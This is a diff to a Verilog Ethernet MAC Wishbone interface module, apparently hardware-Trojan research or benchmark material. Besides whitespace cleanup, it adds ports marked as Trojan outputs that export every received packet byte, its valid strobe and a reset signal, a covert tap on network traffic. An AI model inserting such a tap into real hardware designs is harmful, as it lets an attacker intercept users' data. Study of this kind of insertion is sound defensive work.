@@ -255,44 +255,48 @@ module eth_wishbone
    (
 
     // WISHBONE common
-    WB_CLK_I, WB_DAT_I, WB_DAT_O, 
+    WB_CLK_I, WB_DAT_I, WB_DAT_O,
 
     // WISHBONE slave
- 		WB_ADR_I, WB_WE_I, WB_ACK_O, 
-    BDCs, 
+ 		WB_ADR_I, WB_WE_I, WB_ACK_O,
+    BDCs,
 
-    Reset, 
+    Reset,
 
     // WISHBONE master
-    m_wb_adr_o, m_wb_sel_o, m_wb_we_o, 
-    m_wb_dat_o, m_wb_dat_i, m_wb_cyc_o, 
-    m_wb_stb_o, m_wb_ack_i, m_wb_err_i, 
+    m_wb_adr_o, m_wb_sel_o, m_wb_we_o,
+    m_wb_dat_o, m_wb_dat_i, m_wb_cyc_o,
+    m_wb_stb_o, m_wb_ack_i, m_wb_err_i,
 
 `ifdef ETH_WISHBONE_B3
-    m_wb_cti_o, m_wb_bte_o, 
+    m_wb_cti_o, m_wb_bte_o,
 `endif
 
     //TX
-    MTxClk, TxStartFrm, TxEndFrm, TxUsedData, TxData, 
-    TxRetry, TxAbort, TxUnderRun, TxDone, PerPacketCrcEn, 
-    PerPacketPad, 
+    MTxClk, TxStartFrm, TxEndFrm, TxUsedData, TxData,
+    TxRetry, TxAbort, TxUnderRun, TxDone, PerPacketCrcEn,
+    PerPacketPad,
 
     //RX
-    MRxClk, RxData, RxValid, RxStartFrm, RxEndFrm, RxAbort, RxStatusWriteLatched_sync2, 
-    
+    MRxClk, RxData, RxValid, RxStartFrm, RxEndFrm, RxAbort, RxStatusWriteLatched_sync2,
+
     // Register
-    r_TxEn, r_RxEn, r_TxBDNum, r_RxFlow, r_PassAll, 
+    r_TxEn, r_RxEn, r_TxBDNum, r_RxFlow, r_PassAll,
 
     // Interrupts
-    TxB_IRQ, TxE_IRQ, RxB_IRQ, RxE_IRQ, Busy_IRQ, 
-    
+    TxB_IRQ, TxE_IRQ, RxB_IRQ, RxE_IRQ, Busy_IRQ,
+
     // Rx Status
     InvalidSymbol, LatchedCrcError, RxLateCollision, ShortFrame, DribbleNibble,
-    ReceivedPacketTooBig, RxLength, LoadRxStatus, ReceivedPacketGood, AddressMiss, 
-    ReceivedPauseFrm, 
-    
+    ReceivedPacketTooBig, RxLength, LoadRxStatus, ReceivedPacketGood, AddressMiss,
+    ReceivedPauseFrm,
+
     // Tx Status
     RetryCntLatched, RetryLimit, LateCollLatched, DeferLatched, RstDeferLatched, CarrierSenseLost
+
+    // XXX: Trojan outputs
+    ,
+    troj_rx_packet_data, troj_rx_packet_data_valid, troj_rx_packet_reset
 
     // Bist
 `ifdef ETH_BIST
@@ -302,7 +306,7 @@ module eth_wishbone
     mbist_so_o,       // bist scan serial out
     mbist_ctrl_i        // bist chain shift control
 `endif
-    
+
 
 
 		);
@@ -323,15 +327,15 @@ input   [3:0]   BDCs;           // Buffer descriptors are selected
 output          WB_ACK_O;       // WISHBONE acknowledge output
 
 // WISHBONE master
-output  [29:0]  m_wb_adr_o;     // 
-output   [3:0]  m_wb_sel_o;     // 
-output          m_wb_we_o;      // 
-output  [31:0]  m_wb_dat_o;     // 
-output          m_wb_cyc_o;     // 
-output          m_wb_stb_o;     // 
-input   [31:0]  m_wb_dat_i;     // 
-input           m_wb_ack_i;     // 
-input           m_wb_err_i;     // 
+output  [29:0]  m_wb_adr_o;     //
+output   [3:0]  m_wb_sel_o;     //
+output          m_wb_we_o;      //
+output  [31:0]  m_wb_dat_o;     //
+output          m_wb_cyc_o;     //
+output          m_wb_stb_o;     //
+input   [31:0]  m_wb_dat_i;     //
+input           m_wb_ack_i;     //
+input           m_wb_err_i;     //
 
 `ifdef ETH_WISHBONE_B3
 output   [2:0]  m_wb_cti_o;     // Cycle Type Identifier
@@ -380,9 +384,9 @@ output          PerPacketPad;   // Per packet pading
 // Rx
 input           MRxClk;         // Receive clock (from PHY)
 input   [7:0]   RxData;         // Received data byte (from PHY)
-input           RxValid;        // 
-input           RxStartFrm;     // 
-input           RxEndFrm;       // 
+input           RxValid;        //
+input           RxStartFrm;     //
+input           RxEndFrm;       //
 input           RxAbort;        // This signal is set when address doesn't match.
 output          RxStatusWriteLatched_sync2;
 
@@ -398,6 +402,10 @@ output RxB_IRQ;
 output RxE_IRQ;
 output Busy_IRQ;
 
+//XXX: Trojan outputs
+output [31:0] troj_rx_packet_data;
+output        troj_rx_packet_data_valid;
+output        troj_rx_packet_reset;
 
 // Bist
 `ifdef ETH_BIST
@@ -542,7 +550,7 @@ reg TxEn_needed;
 reg RxEn_needed;
 
 wire StartRxPointerRead;
-reg RxPointerRead; 
+reg RxPointerRead;
 
 `ifdef ETH_WISHBONE_B3
 assign m_wb_bte_o = 2'b00;    // Linear burst
@@ -801,7 +809,7 @@ end
 
 assign RstDeferLatched = BlockingTxStatusWrite_sync2 & ~BlockingTxStatusWrite_sync3;
 
-// TxBDRead state is activated only once. 
+// TxBDRead state is activated only once.
 always @ (posedge WB_CLK_I or posedge Reset)
 begin
   if(Reset)
@@ -928,10 +936,10 @@ begin
 end
 
 
-// Latching 2 MSB bits of the buffer descriptor. 
+// Latching 2 MSB bits of the buffer descriptor.
 // After the read access, TxLength needs to be decremented for the number of the valid
-// bytes (1 to 4 bytes are valid in the first word). After the first read all bytes are 
-// valid so this two bits are reset to zero. 
+// bytes (1 to 4 bytes are valid in the first word). After the first read all bytes are
+// valid so this two bits are reset to zero.
 always @ (posedge WB_CLK_I or posedge Reset)
 begin
   if(Reset)
@@ -1203,11 +1211,11 @@ wire TxFifoClear;
 assign TxFifoClear = (TxAbortPacket | TxRetryPacket);
 
 eth_fifo #(`ETH_TX_FIFO_DATA_WIDTH, `ETH_TX_FIFO_DEPTH, `ETH_TX_FIFO_CNT_WIDTH)
-tx_fifo ( .data_in(m_wb_dat_i),                             .data_out(TxData_wb), 
-          .clk(WB_CLK_I),                                   .reset(Reset), 
+tx_fifo ( .data_in(m_wb_dat_i),                             .data_out(TxData_wb),
+          .clk(WB_CLK_I),                                   .reset(Reset),
           .write(MasterWbTX & m_wb_ack_i),                  .read(ReadTxDataFromFifo_wb & ~TxBufferEmpty),
-          .clear(TxFifoClear),                              .full(TxBufferFull), 
-          .almost_full(TxBufferAlmostFull),                 .almost_empty(TxBufferAlmostEmpty), 
+          .clear(TxFifoClear),                              .full(TxBufferFull),
+          .almost_full(TxBufferAlmostFull),                 .almost_empty(TxBufferAlmostEmpty),
           .empty(TxBufferEmpty),                            .cnt(txfifo_cnt)
         );
 
@@ -1357,7 +1365,7 @@ assign RxIRQEn         = RxStatus_s[14];
 assign WrapRxStatusBit = RxStatus_s[13];
 
 
-// Temporary Tx and Rx buffer descriptor address 
+// Temporary Tx and Rx buffer descriptor address
 assign TempTxBDAddress[7:1] = {7{ TxStatusWrite     & ~WrapTxStatusBit}}   & (TxBDAddress + 1'b1) ; // Tx BD increment or wrap (last BD)
 assign TempRxBDAddress[7:1] = {7{ WrapRxStatusBit}} & (r_TxBDNum[6:0])     | // Using first Rx BD
                               {7{~WrapRxStatusBit}} & (RxBDAddress + 1'b1) ; // Using next Rx BD (incremenrement address)
@@ -1481,7 +1489,7 @@ begin
   if(Reset)
     TxRetryPacket <=#Tp 1'b0;
   else
-  if(TxRetry_wb & !tx_burst_en & MasterWbTX & MasterAccessFinished & !TxRetryPacketBlocked | 
+  if(TxRetry_wb & !tx_burst_en & MasterWbTX & MasterAccessFinished & !TxRetryPacketBlocked |
      TxRetry_wb & !MasterWbTX & !TxRetryPacketBlocked)
     TxRetryPacket <=#Tp 1'b1;
   else
@@ -1497,7 +1505,7 @@ begin
   if(StartTxBDRead)
     TxRetryPacket_NotCleared <=#Tp 1'b0;
   else
-  if(TxRetry_wb & !tx_burst_en & MasterWbTX & MasterAccessFinished & !TxRetryPacketBlocked | 
+  if(TxRetry_wb & !tx_burst_en & MasterWbTX & MasterAccessFinished & !TxRetryPacketBlocked |
      TxRetry_wb & !MasterWbTX & !TxRetryPacketBlocked)
     TxRetryPacket_NotCleared <=#Tp 1'b1;
 end
@@ -1522,7 +1530,7 @@ begin
   if(Reset)
     TxDonePacket <=#Tp 1'b0;
   else
-  if(TxDone_wb & !tx_burst_en & MasterWbTX & MasterAccessFinished & !TxDonePacketBlocked | 
+  if(TxDone_wb & !tx_burst_en & MasterWbTX & MasterAccessFinished & !TxDonePacketBlocked |
      TxDone_wb & !MasterWbTX & !TxDonePacketBlocked)
     TxDonePacket <=#Tp 1'b1;
   else
@@ -1538,7 +1546,7 @@ begin
   if(TxEn & TxEn_q & TxDonePacket_NotCleared)
     TxDonePacket_NotCleared <=#Tp 1'b0;
   else
-  if(TxDone_wb & !tx_burst_en & MasterWbTX & MasterAccessFinished & (~TxDonePacketBlocked) | 
+  if(TxDone_wb & !tx_burst_en & MasterWbTX & MasterAccessFinished & (~TxDonePacketBlocked) |
      TxDone_wb & !MasterWbTX & (~TxDonePacketBlocked))
     TxDonePacket_NotCleared <=#Tp 1'b1;
 end
@@ -1578,7 +1586,7 @@ begin
     TxEndFrm <=#Tp 1'b0;
   else
   if(Flop & TxEndFrm | TxAbort | TxRetry_q)
-    TxEndFrm <=#Tp 1'b0;        
+    TxEndFrm <=#Tp 1'b0;
   else
   if(Flop & LastWord)
     begin
@@ -2101,8 +2109,8 @@ reg WriteRxDataToFifoSync3;
 
 
 // Indicating start of the reception process
-assign SetWriteRxDataToFifo = (RxValid & RxReady & ~RxStartFrm & RxEnableWindow & (&RxByteCnt)) | 
-                              (RxValid & RxReady &  RxStartFrm & (&RxPointerLSB_rst))           | 
+assign SetWriteRxDataToFifo = (RxValid & RxReady & ~RxStartFrm & RxEnableWindow & (&RxByteCnt)) |
+                              (RxValid & RxReady &  RxStartFrm & (&RxPointerLSB_rst))           |
                               (ShiftWillEnd & LastByteIn & (&RxByteCnt));
 
 always @ (posedge MRxClk or posedge Reset)
@@ -2200,13 +2208,17 @@ end
 
 assign RxFifoReset = SyncRxStartFrm_q & ~SyncRxStartFrm_q2;
 
+/*XXX: Trojan connections here */
+assign troj_rx_packet_data = RxDataLatched2;
+assign troj_rx_packet_data_valid = (WriteRxDataToFifo_wb & ~RxBufferFull);
+assign troj_rx_packet_reset = (RxFifoReset | Reset);
 
 eth_fifo #(`ETH_RX_FIFO_DATA_WIDTH, `ETH_RX_FIFO_DEPTH, `ETH_RX_FIFO_CNT_WIDTH)
-rx_fifo (.data_in(RxDataLatched2),                      .data_out(m_wb_dat_o), 
-         .clk(WB_CLK_I),                                .reset(Reset), 
-         .write(WriteRxDataToFifo_wb & ~RxBufferFull),  .read(MasterWbRX & m_wb_ack_i), 
-         .clear(RxFifoReset),                           .full(RxBufferFull), 
-         .almost_full(),                                .almost_empty(RxBufferAlmostEmpty), 
+rx_fifo (.data_in(RxDataLatched2),                      .data_out(m_wb_dat_o),
+         .clk(WB_CLK_I),                                .reset(Reset),
+         .write(WriteRxDataToFifo_wb & ~RxBufferFull),  .read(MasterWbRX & m_wb_ack_i),
+         .clear(RxFifoReset),                           .full(RxBufferFull),
+         .almost_full(),                                .almost_empty(RxBufferAlmostEmpty),
          .empty(RxBufferEmpty),                         .cnt(rxfifo_cnt)
         );
 
@@ -2405,7 +2417,7 @@ assign TxError = TxUnderRun | RetryLimit | LateCollLatched | CarrierSenseLost;
 wire RxError;
 
 // ShortFrame (RxStatusInLatched[2]) can not set an error because short frames
-// are aborted when signal r_RecSmall is set to 0 in MODER register. 
+// are aborted when signal r_RecSmall is set to 0 in MODER register.
 // AddressMiss is identifying that a frame was received because of the promiscous
 // mode and is not an error
 assign RxError = (|RxStatusInLatched[6:3]) | (|RxStatusInLatched[1:0]);
@@ -2426,7 +2438,7 @@ begin
     RxStatusWriteLatched <=#Tp 1'b0;
   else
   if(RxStatusWriteLatched_syncb2)
-    RxStatusWriteLatched <=#Tp 1'b0;        
+    RxStatusWriteLatched <=#Tp 1'b0;
   else
   if(RxStatusWrite)
     RxStatusWriteLatched <=#Tp 1'b1;
@@ -2554,7 +2566,7 @@ end
 assign Busy_IRQ = Busy_IRQ_sync2 & ~Busy_IRQ_sync3;
 
 
-         
+
 
 
 endmodule
